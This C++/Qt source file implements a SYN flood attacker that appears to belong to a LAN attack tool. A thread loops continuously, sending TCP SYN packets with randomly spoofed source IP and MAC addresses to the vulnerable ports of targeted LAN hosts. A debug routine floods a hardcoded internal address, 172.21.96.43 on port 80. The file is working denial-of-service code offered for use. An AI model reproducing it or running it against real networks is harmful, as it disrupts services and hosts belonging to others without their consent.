#include "synfloodattacker.h"
#include <QDebug>
#include "LANAttacker/lanpcap.h"
#include <QTime>
#include <windows.h>

SynFloodAttacker::SynFloodAttacker(QObject *parent, class  LANPcap* LANPcap):QThread(parent),_LANPcap(LANPcap)
{

}

SynFloodAttacker::~SynFloodAttacker()
{
    this->requestInterruption();
    this->quit();
    this->wait();
}

void SynFloodAttacker::AddTarget(QString IpAddr)
{
    QString IndexStr=IpAddr.split(".")[3];
    AddTarget(IndexStr.toInt());
}

void SynFloodAttacker::RemoveTarget(QString IpAddr)
{
    QString IndexStr=IpAddr.split(".")[3];
    RemoveTarget(IndexStr.toInt());
}

void SynFloodAttacker::StartAttackTargets()
{
    if(this->isRunning())
    {
        qDebug()<<"Thread is already in running";
        return;
    }

    this->start();

}

void SynFloodAttacker::StopAttackTargets()
{
    this->requestInterruption();
    this->terminate();
}

void SynFloodAttacker::run()
{
    while(!isInterruptionRequested())
    {
        for(unsigned char LANIndex:Targets)
        {

               this->SendSynFloodPacket(LANIndex);
        }
        SendSynDebug();
    }

}

void SynFloodAttacker::SendSynFloodPacket(unsigned char LANIndex)
{
    if(_LANPcap)
    {

        const LANHostInfo& DstHost=_LANPcap->GetHostInfo(LANIndex);


        if(!DstHost.bIsHostVulerable)return ;


        LANHostInfo SrcHost;
        //set a random ip,don't use ip address in the same LAN
        for(int i=0;i<4;++i)SrcHost.Ipv4Addr[i]=qrand()%0xff;
        //fill the mac address with random value
        for(int i=0;i<6;++i)SrcHost.MacAddr[i]=qrand()%0xff;

        for(int i=0;i<CheckVulerablePortsSize;++i)
        {
            //if it is vulerable port we send packet to its vulerable port
            if(DstHost.bPortVulerable[i])
            {
                _LANPcap->SendTcpSynPacket(SrcHost,DstHost,(qrand()%65534)+1,CheckVulerablePorts[i]);
               // _LANPcap->SendTcpSynPacket(SrcHost,DstHost,(qrand()%65534)+1,(qrand()%65534)+1);
            }
        }


    }

}

void SynFloodAttacker::SendSynDebug()
{
     if(_LANPcap)
     {
         LANHostInfo SrcHost;



         //set a random ip,don't use ip address in the same LAN
         for(int i=0;i<4;++i)SrcHost.Ipv4Addr[i]=qrand()%0xff;
         //fill the mac address with random value
         for(int i=0;i<6;++i)SrcHost.MacAddr[i]=qrand()%0xff;
         LANHostInfo DstHost;


         //172.21.96.43,fill the mac with gateway's mac
         DstHost.Ipv4Addr[0]=172; DstHost.Ipv4Addr[1]=21;DstHost.Ipv4Addr[2]=96;DstHost.Ipv4Addr[3]=43;
         DstHost.MacAddr[0]=0x44; DstHost.MacAddr[1]=0xd3;DstHost.MacAddr[2]=0xca; DstHost.MacAddr[3]=0x5e;DstHost.MacAddr[4]=0x13; DstHost.MacAddr[5]=0x80;
         _LANPcap->SendTcpSynPacket(SrcHost,DstHost,(qrand()%65534)+1,80);

        // _LANPcap->SendTcpSynPacket(_LANPcap->GetHostInfo(146),DstHost,(qrand()%65534)+1,80);

     }
}






